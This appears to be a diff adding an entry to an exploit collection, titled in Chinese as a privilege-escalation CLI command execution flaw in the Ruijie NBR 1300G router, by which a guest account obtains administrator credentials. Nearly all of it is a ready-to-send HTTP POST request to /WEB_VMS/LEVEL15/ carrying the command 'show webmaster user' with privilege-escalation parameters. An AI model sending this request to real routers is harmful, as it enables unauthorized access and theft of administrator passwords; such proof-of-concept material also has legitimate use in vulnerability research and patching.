@@ -1,0 +1,10 @@
+# 锐捷 NBR 1300G 路由器越权CLI命令执行漏洞
+# 锐捷 NBR 1300G 路由器越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码
+POST /WEB_VMS/LEVEL15/?acid=80051540&bid=hd_tag_m8mv245d HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv245d
+RM-PRO-Token: d19fb0124197d636fac6b94c81a4db8f
+RM-PRO-Time: 1742808364284
+User-Agent: curl/7.83.1
+
+command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
